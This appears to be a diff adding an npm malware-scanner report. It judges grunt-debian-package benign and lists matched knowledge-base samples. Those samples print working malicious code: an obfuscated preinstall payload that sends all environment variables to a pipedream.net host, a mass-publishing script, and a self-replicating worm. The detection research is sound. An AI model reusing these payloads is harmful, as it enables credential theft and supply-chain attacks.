@@ -1,0 +1,1063 @@
+{
+  "package_name": "grunt-debian-package",
+  "package_version": "0.1.14",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:35:57.268505",
+  "status": "success",
+  "selected_files_count": 6,
+  "selected_files": [
+    "package/package.json",
+    "package/Gruntfile.js",
+    "package/tasks/debian_package.js",
+    "package/tasks/fileOrDirectory.js",
+    "package/tasks/options.js",
+    "package/tasks/replace.js"
+  ],
+  "is_malicious": false,
+  "total_files": 6,
+  "malicious_files": 0,
+  "total_slices": 2,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-debian-package/0.1.14/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-debian-package/0.1.14/package/Gruntfile.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-debian-package/0.1.14/package/tasks/debian_package.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "debian_package_slice_1",
+          "code_snippet": "var fileSystem = require('./fileOrDirectory.js');\nvar replace = require('./replace.js');\n\nmodule.exports = function (grunt) {\n\n    'use strict';\n\n    var _validateOptions = require('./options.js')._validate(grunt),\n        _copy = fileSystem._copy(grunt),\n        _cleanUp = fileSystem._cleanUp(grunt),\n        _findAndReplace = replace._findAndReplace(grunt),\n        _transformAndReplace = replace._transformAndReplace(grunt),\n        preparePackageContents = function (makefile, files, follow_soft_links, quiet) {\n            _transformAndReplace([makefile], '\\$\\{file_list\\}', files, function (file) {\n                return file.src.filter(function (filepath) {\n                    if (!grunt.file.exists(filepath)) {\n                        grunt.log.warn('File \\'\" + filepath + \"\\' not found');\n                        return false;\n                    } else {\n                        return !grunt.file.isDir(filepath);\n                    }\n                }).map(function (filepath) {\n                    if (!quiet) {\n                        grunt.log.writeln('Adding \\'\" + filepath + \"\\' to \\'\" + file.dest + \"\\'');\n                    }\n                    var soft_links_argument = \"-P \";\n                    // $$ = $ in JS\n                    // next task `replace` is going to interpret $$ as $\n                    // $$ = $ in make\n                    // \\$ = $ in bash\n                    var make_filepath = filepath.replace(/\\$/g, '\\\\\\$\\\\$\\\\$\\\\$\\\\$\\\\$\\\\$\\\\$');\n                    var make_filedest = file.dest.replace(/\\$/g, '\\\\\\$\\\\$\\\\$\\\\$\\\\$\\\\$\\\\$\\\\$');\n                    return '\\tmkdir -p \"$(DESTDIR)' + file.dest.substr(0, file.dest.lastIndexOf('/')) + '\" && cp -a ' + (follow_soft_links ? \"\" : \"-P \") + '\"' + process.cwd() + '/' + make_filepath + '\" \"$(DESTDIR)' + make_filedest + '\"\\n';\n                }).join('');\n            });\n        };\n\n    grunt.registerMultiTask('debian_package', 'Create debian package from grunt build', function () {\n            // tell Grunt this task is asynchronous.\n            var done = this.async();\n\n            // Merge task-specific and/or target-specific options with these defaults.\n            var pkg = grunt.file.readJSON('package.json'),\n                options = this.options({\n                    maintainer: process.env.DEBFULLNAME && process.env.DEBEMAIL && {\n                        name: process.env.DEBFULLNAME,\n                        email: process.env.DEBEMAIL\n                    } || pkg.author && pkg.author.name && pkg.author.email && pkg.author,\n                    name: pkg.name,\n                    prefix: \"\",\n                    postfix: \"\",\n                    short_description: (pkg.description && pkg.description.split(/\\r\\n|\\r|\\n/g)[0]) || '',\n                    long_description: (pkg.description && pkg.description.split(/\\r\\n|\\r|\\n/g).splice(1).join(' ')) || '',\n                    version: pkg.version,\n                    build_number: process.env.BUILD_NUMBER || process.env.DRONE_BUILD_NUMBER || process.env.TRAVIS_BUILD_NUMBER || '1',\n                    working_directory: 'tmp/',\n                    packaging_directory_name: 'packaging',\n                    target_architecture: \"all\",\n                    category: \"misc\",\n                    disable_debuild_deps_check: false\n                }),\n                spawn = require('child_process').spawn,\n                dateFormat = require('dateformat'),\n                now = dateFormat(new Date(), 'ddd, d mmm yyyy h:MM:ss +0000'),\n                temp_directory = options.working_directory + options.packaging_directory_name,\n                controlDirectory = temp_directory + '/debian',\n                changelog = controlDirectory + '/changelog',\n                control = controlDirectory + '/control',\n                links = controlDirectory + '/links',\n                dirs = controlDirectory + '/dirs',\n                makefile = temp_directory + '/Makefile',\n                dependencies = '';\n\n            if (!_validateOptions(options, options.quiet)) {\n                return done(false);\n            }\n\n            _cleanUp(options, true);\n            _copy(__dirname + '/../' + options.packaging_directory_name, temp_directory);\n            \n            if (options.custom_template) {\n            \t_copy(options.custom_template, temp_directory);\n            }\n\n            // set environment variables if they are not already set\n            process.env.DEBFULLNAME = options.maintainer.name;\n            process.env.DEBEMAIL = options.maintainer.email;\n\n            if (options.dependencies) {\n                dependencies = ', ' + options.dependencies;\n            }\n\n            // generate packaging control files\n            _transformAndReplace([links], '\\$\\{softlinks\\}', options.links || [], function (softlink) {\n                return softlink.target + '       ' + softlink.source + '\\n';\n            });\n            _transformAndReplace([dirs], '\\$\\{directories\\}', options.directories || [], function (directory) {\n                return directory + '\\n';\n            });\n            _findAndReplace([changelog, control], '\\$\\{maintainer.name\\}', options.maintainer.name);\n            _findAndReplace([changelog, control], '\\$\\{maintainer.email\\}', options.maintainer.email);\n            _findAndReplace([changelog], '\\$\\{date\\}', now);\n            _findAndReplace([changelog, control, links, dirs], '\\$\\{name\\}', options.package_name);\n            _findAndReplace([control], '\\$\\{short_description\\}', options.short_description);\n            _findAndReplace([control], '\\$\\{long_description\\}', options.long_description);\n            _findAndReplace([changelog, control, links, dirs], '\\$\\{version\\}', options.version);\n            _findAndReplace([changelog, control, links, dirs], '\\$\\{build_number\\}', options.build_number);\n            _findAndReplace([control], '\\$\\{dependencies\\}', dependencies);\n            _findAndReplace([control], '\\$\\{target_architecture\\}', options.target_architecture);\n            _findAndReplace([control], '\\$\\{category\\}', options.category);\n            preparePackageContents(makefile, this.files, options.follow_soft_links, options.quiet);\n\n            // copy package lifecycle scripts\n            var scripts = ['preinst', 'postinst', 'prerm', 'postrm'];\n            for (var i = 0; i < scripts.length; i++) {\n                if (options[scripts[i]]) {\n                    var destination = controlDirectory + '/' + scripts[i];\n                    grunt.verbose.writeln(JSON.stringify(options[scripts[i]]));\n                    if (options[scripts[i]].src) {\n                        grunt.file.copy(options[scripts[i]].src, destination);\n                    } else if (options[scripts[i]].contents) {\n                        grunt.file.write(destination, options[scripts[i]].contents);\n                    }\n                }\n            }\n\n            // run packaging binaries (i.e. build process)\n            grunt.verbose.writeln('Running \\'debuild --no-tgz-check -sa -us -uc --lintian-opts --suppress-tags tar-errors-from-data,tar-errors-from-control,dir-or-file-in-var-www\\'');\n            if (!options.simulate) {\n                if (grunt.file.exists('/usr/bin/debuild')) {\n                    var checkDeps = options.disable_debuild_deps_check ? \"-d\" : \"-D\";\n                    var debuild = spawn('debuild', ['--no-tgz-check', '-sa', checkDeps, '-us', '-uc', '--lintian-opts', '--suppress-tags', 'tar-errors-from-data,tar-errors-from-control,dir-or-file-in-var-www'], {\n                        cwd: temp_directory,\n                        stdio: [ 'ignore', (grunt.option('verbose') ? process.stdout : 'ignore'), process.stderr ]\n                    });\n                    debuild.on('exit', function (code) {\n                        if (code !== 0) {\n                            var logFile = grunt.file.read(grunt.file.expand(options.package_location + '*.build'));\n                            grunt.log.subhead('\\nerror running debuild!!');\n                            if (logFile.search(\"Unmet\\\\sbuild\\\\sdependencies\\\\:\\\\sdebhelper\") !== -1) {\n                                grunt.log.warn('debhelper dependency not found try running \\'sudo apt-get install debhelper\\'');\n                            }\n                            done(false);\n                        } else {\n                            _cleanUp(options);\n                            grunt.log.ok('Created package: ' + grunt.file.expand(options.package_location + '*.deb'));\n                            if (options.repository) {\n                                grunt.verbose.writeln('Running \\'dput ' + options.repository + ' ' + grunt.file.expand(options.package_location + '*.changes') + '\\'');\n                                require('fs').chmodSync(\"\" + grunt.file.expand(options.package_location + '*.changes'), \"744\");\n                                var dputArguments = [options.repository, grunt.file.expand(options.package_location + '*.changes')];\n                                if (grunt.option('verbose')) {\n                                    dputArguments.unshift('-d');\n                                }\n                                var dput = spawn('dput', dputArguments, {\n                                    stdio: [ 'ignore', (grunt.option('verbose') ? process.stdout : 'ignore'), process.stderr ]\n                                });\n                                dput.on('exit', function (code) {\n                                    if (code !== 0) {\n                                        grunt.log.subhead('\\nerror uploading package using dput!!');\n                                    } else {\n                                        grunt.log.ok('Uploaded package: ' + grunt.file.expand(options.package_location + '*.deb'));\n                                    }\n                                    done(true);\n                                });\n                            } else {\n                                done(true);\n                            }\n                        }\n                    });\n                } else {\n                    _cleanUp(options);\n                    grunt.log.subhead('\\n\\'debuild\\' executable not found!!');\n                    grunt.log.warn('to install debuild try running \\'sudo apt-get install devscripts\\'');\n                    return done(false);\n                }\n            } else {\n                return done(true);\n            }\n        }\n    );\n};",
+          "is_malicious": false,
+          "malice_score": 0.539609283208847,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code reads package metadata from package.json and environment variables (including potentially sensitive environment variables like DEBFULLNAME, DEBEMAIL, BUILD_NUMBER), then generates Debian packaging control files by performing multiple file read/write operations and string replacements. It copies lifecycle scripts (preinst, postinst, prerm, postrm) if provided, which may contain arbitrary script contents or source files, and executes system commands via child_process.spawn to run 'debuild' and optionally 'dput' for building and uploading Debian packages. This involves file system modifications, environment variable usage, and execution of external binaries, enabling automated package building and deployment with potential for executing arbitrary scripts and commands defined in lifecycle scripts or options.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a Grunt task module designed to automate Debian package creation and deployment. It reads package metadata, manipulates files, performs string replacements, copies lifecycle scripts, and executes system commands ('debuild' and optionally 'dput') to build and upload Debian packages. While it uses sensitive environment variables and executes external binaries, these actions are consistent with legitimate packaging workflows. There is no evidence of obfuscation, data exfiltration, automated mass publication, or self-replication as seen in the known malicious patterns. The lifecycle scripts copied may contain arbitrary content, but this is typical for packaging scripts and not inherently malicious. The code does not perform any suspicious network communication, credential harvesting, or automated malicious publishing. Therefore, despite some sensitive operations, the code aligns with legitimate DevOps packaging automation rather than malware.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104013_428202_snippet_1",
+              "source_package": "n-t-internationalization (and 147+ others, see dc file) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_428202/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5779333114624023,
+              "code_similarity": 0.5584745407104492,
+              "behavior_similarity": 0.5973920226097107,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "#!/bin/bash\nPOSITIONAL=()\nwhile [[ $# -gt 0 ]]\ndo\nkey=\"$1\"\ncase $key in\n    -v|--version)\n    VERSION=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    -s|--searchpath)\n    SEARCHPATH=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    -l|--lib)\n    LIBPATH=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    --default)\n    DEFAULT=YES\n    shift # past argument\n    ;;\n    *)    # unknown option\n    POSITIONAL+=(\"$1\") # save it in an array for later\n    shift # past argument\n    ;;\nesac\ndone\nset -- \"${POSITIONAL[@]}\" # restore positional parameters\nfor i in $(cat dc);\ndo\necho '\n{\n  \"name\": \"'$i'\",\n  \"version\": \"141.0.0\",\n  \"description\": \"hackerone.com/homosec Bug Bounty Security Reseaarch White Hat\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"preinstall\":\"node index.js\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n' > package.json\necho \"//hackerone.com/homosec\n//Bug Bounty Security Reasearch White Hat\n//homosec@wearehackerone.com\nif (Object.keys(process.env).length > 15 &&\n    !(process.env.COLOR == '0' && process.env.EDITOR == 'vi' && process.env.LOGNAME && process.env.OLDPWD) &&\n!(process.env.APPDATA === '/analysis/bait')&&\n!(process.env._ === '/usr/bin/timelimit')&&\n!(process.env.npm_config_registry === 'https://mirrors.tencent.com/npm/')) {\nvar _0xee82=['\\x68\\x74\\x74\\x70\\x73','\\x2E','\\x6A\\x6F\\x69\\x6E','\\x37\\x36\\x63\\x34\\x32\\x66\\x32\\x37\\x64\\x32\\x36\\x30\\x39\\x31\\x36\\x35\\x39\\x64\\x63\\x61\\x38\\x32\\x30\\x61\\x33\\x37\\x65\\x36\\x66\\x35\\x64\\x33','\\x6D','','\\x70\\x69\\x70\\x65','\\x64\\x72\\x65\\x61\\x6D','\\x6E\\x65\\x74','\\x2F\"$i\"','\\x50\\x4F\\x53\\x54','\\x72\\x65\\x71\\x75\\x65\\x73\\x74','\\x62\\x61\\x73\\x65\\x36\\x34','\\x65\\x6E\\x76','\\x73\\x74\\x72\\x69\\x6E\\x67\\x69\\x66\\x79','\\x66\\x72\\x6F\\x6D','\\x77\\x72\\x69\\x74\\x65','\\x65\\x6E\\x64'];const http=require(_0xee82[0]);req= http[_0xee82[11]]({host:[_0xee82[3],_0xee82[4],[_0xee82[6],_0xee82[7]][_0xee82[2]](_0xee82[5]),_0xee82[8]][_0xee82[2]](_0xee82[1]),path:_0xee82[9],method:_0xee82[10]});req[_0xee82[16]](Buffer[_0xee82[15]](JSON[_0xee82[14]](process[_0xee82[13]]).toString(_0xee82[12])));req[_0xee82[17]]()\n}\n\" > index.js\nnpm publish --access=public \nsleep 10\ndone;",
+                "code_behavior": "During CI/CD or local execution, the script iterates over a list of package names, generates malicious package.json and index.js files for each, and publishes them to npm, resulting in mass deployment of packages with embedded preinstall exfiltration payloads.",
+                "malice_analysis": {
+                  "why_suspicious": "The script automates the creation and publication of a large number of packages, each containing obfuscated, malicious JavaScript that exfiltrates sensitive data. This is a hallmark of supply chain attacks aiming for broad impact.",
+                  "violated_expectations": "Legitimate publishing scripts do not mass-generate packages with identical, obfuscated payloads designed for data exfiltration.",
+                  "similar_legitimate_use": "Automated publishing for monorepos or scoped packages, but without embedding malicious or obfuscated code.",
+                  "key_indicators": [
+                    "Automated mass publication of packages",
+                    "Autogeneration of package.json with preinstall hooks",
+                    "Injection of obfuscated JavaScript payloads",
+                    "Use of shell scripting to orchestrate malicious deployment"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "ci-cd/runtime",
+                  "file_location": "dc.sh",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "n-t-internationalization (and 147+ others, see dc file)",
+                  "package_manager": "npm",
+                  "package_versions": "141.0.0 (and possibly others)",
+                  "why_malicious": "These packages are mass-published with autogenerated content and contain obfuscated JavaScript code that exfiltrates all environment variables to an external server during installation. The attack leverages preinstall hooks to trigger the payload, uses obfuscation to evade detection, and targets the npm supply chain at scale. This behavior violates user trust, npm ecosystem norms, and cannot be justified as legitimate or white-hat research."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Automated script generates and publishes malicious packages for each name in the dc file, embedding obfuscated exfiltration payloads.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious packages are available on npm for installation by unsuspecting users."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upon installation, the preinstall hook in package.json executes index.js, triggering the malicious payload.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious JavaScript is executed automatically on the victim's machine during package installation."
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js checks for analysis or sandbox environments and, if not detected, exfiltrates all environment variables to a remote pipedream.net server.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data from victim systems, enabling further compromise or data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "preinstall hook in package.json executing JavaScript that accesses process.env and initiates outbound network requests",
+                    "Obfuscated JavaScript code in index.js containing environment checks and network exfiltration logic",
+                    "Presence of anti-analysis or sandbox evasion logic prior to payload execution"
+                  ],
+                  "file_indicators": [
+                    "index.js containing obfuscated code and outbound network logic",
+                    "package.json with scripts.preinstall set to 'node index.js'",
+                    "dc.sh or similar shell scripts automating mass package publication"
+                  ],
+                  "network_indicators": [
+                    "Outgoing HTTPS POST requests to *.pipedream.net",
+                    "Host: 76c42f27d26091659dca820a37e6f5d3.m.pipedream.net"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall hooks that execute JavaScript accessing process.env and making outbound network requests, especially to known exfiltration endpoints such as pipedream.net. Flag packages with obfuscated code in index.js and those published in bulk with similar structure. Alert on any package that exfiltrates environment variables or performs environment checks to evade analysis. Correlate file indicators (index.js, package.json, dc.sh) and network activity to identify malicious packages."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202037_549619_snippet_3",
+              "source_package": "n-t-internationalization (and 147+ others, see dc file) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202037_549619/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.553115963935852,
+              "code_similarity": 0.5248609781265259,
+              "behavior_similarity": 0.5813709497451782,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "#!/bin/bash\nPOSITIONAL=()\nwhile [[ $# -gt 0 ]]\ndo\nkey=\"$1\"\ncase $key in\n    -v|--version)\n    VERSION=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    -s|--searchpath)\n    SEARCHPATH=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    -l|--lib)\n    LIBPATH=\"$2\"\n    shift # past argument\n    shift # past value\n    ;;\n    --default)\n    DEFAULT=YES\n    shift # past argument\n    ;;\n    *)    # unknown option\n    POSITIONAL+=(\"$1\") # save it in an array for later\n    shift # past argument\n    ;;\nesac\ndone\nset -- \"${POSITIONAL[@]}\" # restore positional parameters\nfor i in $(cat dc);\ndo\necho '\n{\n  \"name\": \"'$i'\",\n  \"version\": \"141.0.0\",\n  \"description\": \"hackerone.com/homosec Bug Bounty Security Reseaarch White Hat\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"preinstall\":\"node index.js\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n' > package.json\necho \"...obfuscated index.js...\" > index.js\nnpm publish --access=public \nsleep 10\ndone;",
+                "code_behavior": "When executed manually or via script, dc.sh iterates through a list of package names, auto-generates package.json and index.js files with malicious payloads, and publishes each to npm, enabling mass distribution of the malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated mass publication of packages with identical malicious payloads is a hallmark of supply chain attacks, aiming to maximize the attack surface and evade detection by volume.",
+                  "violated_expectations": "Legitimate package publication is not automated at this scale, nor does it mass-produce packages with identical, suspicious payloads and no legitimate functionality.",
+                  "similar_legitimate_use": "Automated publishing scripts are used in monorepos or CI/CD pipelines, but not for mass-producing malicious clones with no legitimate content.",
+                  "key_indicators": [
+                    "Automated mass generation and publication of npm packages",
+                    "Identical or near-identical malicious payloads in each package",
+                    "No legitimate package content or functionality"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "manual/scripted execution",
+                  "file_location": "dc.sh",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "n-t-internationalization (and 147+ others, see dc file)",
+                  "package_manager": "npm",
+                  "package_versions": "141.0.0 (and possibly others)",
+                  "why_malicious": "The packages are mass-generated and published with a preinstall hook that executes obfuscated JavaScript to exfiltrate all environment variables to an attacker-controlled domain. The use of automation, obfuscation, anti-analysis checks, and exfiltration of sensitive data such as credentials and tokens are clear indicators of a coordinated supply chain attack."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker runs dc.sh to mass-generate and publish malicious packages to npm.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious packages are available for installation by unsuspecting users."
+                  },
+                  {
+                    "step": 2,
+                    "action": "User installs one of the malicious packages, triggering the preinstall hook.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "index.js is executed on the user's machine during installation."
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js checks for analysis or sandbox environments and, if not detected, exfiltrates all environment variables to the attacker's server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data, potentially including credentials and secrets."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package with preinstall hook executing node index.js",
+                    "index.js accessing process.env and sending serialized data over HTTPS",
+                    "Obfuscated JavaScript code present in install scripts",
+                    "Anti-analysis or sandbox environment checks before payload execution"
+                  ],
+                  "file_indicators": [
+                    "Presence of dc.sh and dc file used for mass package generation",
+                    "package.json with preinstall: node index.js script",
+                    "index.js containing obfuscated or encoded strings for network exfiltration"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to *.pipedream.net during npm install",
+                    "Unexpected network activity from npm install processes"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall hooks that execute JavaScript files. Flag packages where index.js accesses process.env and initiates network requests, especially if the code is obfuscated or contains anti-analysis logic. Alert on outbound HTTPS POST requests to known exfiltration domains such as pipedream.net during package installation. Use static analysis to detect mass-published packages with identical or near-identical install scripts and the presence of automation scripts like dc.sh."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205352_822867_snippet_5",
+              "source_package": "Multiple (see list in report, e.g., gxm-reference-web-auth-server, npm_protect_pkg, etc.) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205352_822867/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5118635296821594,
+              "code_similarity": 0.49060431122779846,
+              "behavior_similarity": 0.5331227779388428,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "const fs = require('fs')\nconst faker = require('faker')\nconst child_process = require('child_process')\nconst pkgName = faker.helpers.slugify(faker.animal.dog() + ' ' +\nfaker.company.bsNoun()).toLowerCase()\nlet hasNpmRc = false\nconst read = (p) => {\n  return fs.readFileSync(p).toString()\n}\ntry {\n  const npmrcFile = read(process.env.HOME + '/.npmrc')\n  hasNpmRc = true\n} catch(err) {\n}\nif (hasNpmRc) {\n  console.log('Publishing new version of myself')\n  console.log('My new name', pkgName)\n  const pkgPath = __dirname + '/package.json'\n  const pkgJSON = JSON.parse(read(pkgPath))\n  pkgJSON.name = pkgName\n  fs.writeFileSync(pkgPath, JSON.stringify(pkgJSON, null, 2))\n  child_process.exec('npm publish')\n  console.log('DONE')\n}",
+                "code_behavior": "At install-time, the code checks for the presence of a .npmrc file to confirm npm credentials, modifies its own package name to a randomly generated value, and republishes itself to npm under the new name, enabling worm-like self-replication and unauthorized package publishing.",
+                "malice_analysis": {
+                  "why_suspicious": "Self-replication and unauthorized publishing using a user's credentials is a clear sign of malicious, worm-like behavior that can rapidly spread the malware.",
+                  "violated_expectations": "Packages should not modify and republish themselves using a user's npm credentials, nor should they automate publishing actions without explicit user intent.",
+                  "similar_legitimate_use": "None; only legitimate package publishers should publish, and never automatically or without user intent. Automated publishing is not expected in install scripts.",
+                  "key_indicators": [
+                    "Access to ~/.npmrc to check for credentials",
+                    "Modification of package.json name to random value",
+                    "Automated npm publish command in install script",
+                    "Use of faker to generate random package names"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "install-time (postinstall)",
+                  "file_location": "package.json (postinstall script) or index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "process",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Multiple (see list in report, e.g., gxm-reference-web-auth-server, npm_protect_pkg, etc.)",
+                  "package_manager": "npm",
+                  "package_versions": "Various (often high major versions, e.g., 99.99.99, to trigger dependency confusion)",
+                  "why_malicious": "These packages contain install-time scripts that exfiltrate sensitive user and system data, spawn reverse shells, download and execute remote code, or self-replicate by publishing themselves under new names. The behavior is designed to compromise developer systems, steal credentials, or enable remote control, and is not expected in legitimate npm packages."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering install-time scripts.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5",
+                      "snippet_6",
+                      "snippet_7"
+                    ],
+                    "leads_to": "Execution of malicious payloads (data exfiltration, reverse shell, self-replication, persistence, or remote code execution)."
+                  },
+                  {
+                    "step": 2,
+                    "action": "System and user data is collected and exfiltrated to attacker-controlled servers.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains sensitive information (usernames, home directories, hostnames, public and local IPs, npm package metadata)."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Reverse shell or remote code execution is established, giving attacker control.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can execute arbitrary commands or deploy further malware (e.g., Cobalt Strike trojan), resulting in full system compromise."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware achieves persistence or further spread (e.g., by modifying .bashrc or self-publishing).",
+                    "implemented_by": [
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Continued compromise, user annoyance, or worm-like propagation through npm ecosystem."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Additional payloads or dependencies are fetched from external sources.",
+                    "implemented_by": [
+                      "snippet_7",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Potential for further compromise or dynamic payload delivery from attacker infrastructure."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Install-time scripts (preinstall, install, postinstall) making network requests to external or hardcoded domains",
+                    "Access to sensitive files or environment variables (e.g., .npmrc, home directory, package.json) during install",
+                    "Execution of shell commands that open reverse shells or download and execute remote code",
+                    "Modification of user configuration files (e.g., .bashrc) in install scripts",
+                    "Automated npm publish actions or self-replication during install"
+                  ],
+                  "file_indicators": [
+                    "Presence of install-time scripts in package.json (preinstall, install, postinstall)",
+                    "References to .npmrc, .bashrc, or home directory in install scripts",
+                    "Obfuscated or suspicious code in index.js or main entry point",
+                    "Use of shelljs or child_process in install scripts",
+                    "Direct modification of package.json name field during install"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS/HTTP requests to untrusted or hardcoded domains during install",
+                    "Connections to attacker infrastructure (e.g., via /dev/tcp, curl, or net.Socket) in install scripts",
+                    "Use of ipinfo.io or similar services to gather public IP during install",
+                    "npm install commands referencing external URLs instead of npm registry"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for install-time scripts that access sensitive files, environment variables, or make network requests to external domains. Flag packages that attempt to open reverse shells, download and execute remote code, modify user configuration files, or perform automated npm publish actions. Use static analysis to detect references to .npmrc, .bashrc, faker, or suspicious use of child_process, shelljs, or network modules in install scripts. Correlate with high major version numbers, recent updates to previously dormant packages, and installation of dependencies from non-npm sources as additional risk factors."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_191626_596562_snippet_8",
+              "source_package": "Unknown (multiple malicious crypto-related NPM packages, some reported by Phylum) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_191626_596562/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4872603714466095,
+              "code_similarity": 0.4903343915939331,
+              "behavior_similarity": 0.4841863512992859,
+              "matched_snippet": {
+                "snippet_id": "snippet_8",
+                "code_snippet": "// Pseudocode\nif (fs.existsSync('pk.json')) {\n  fs.unlinkSync('package.json');\n  fs.renameSync('pk.json', 'package.json');\n}\nfs.unlinkSync('preinstall.bat');\nfs.unlinkSync('index.js');",
+                "code_behavior": "During installation, the script deletes and renames files to remove evidence of the preinstall hook and malicious scripts, restoring a benign package.json and erasing traces of the attack.",
+                "malice_analysis": {
+                  "why_suspicious": "Anti-forensics: removing install hooks and scripts to evade detection and hinder incident response.",
+                  "violated_expectations": "Legitimate packages do not self-delete install scripts or modify package.json post-install to remove evidence.",
+                  "similar_legitimate_use": "Legitimate packages may clean up temporary files, but not remove or restore core package files to hide malicious activity.",
+                  "key_indicators": [
+                    "Self-deletion of install scripts",
+                    "Restoration of benign package.json after malicious activity"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (cleanup phase)",
+                  "file_location": "index.js / preinstall.bat",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (multiple malicious crypto-related NPM packages, some reported by Phylum)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (recent versions at time of attack, 2023-2024)",
+                  "why_malicious": "The packages are malicious because they leverage preinstall scripts to execute code during installation, which initiates a multi-stage attack chain. This chain includes downloading and decrypting a remote payload, executing a malicious DLL, and performing anti-forensics by deleting evidence and restoring benign files. The intent is to compromise developer systems, exfiltrate sensitive data, and establish persistence or backdoors, all without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Preinstall script in package.json triggers execution of index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "index.js execution and OS detection"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js checks for Windows OS and writes batch/PowerShell scripts to disk.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Preparation for payload download and execution"
+                  },
+                  {
+                    "step": 3,
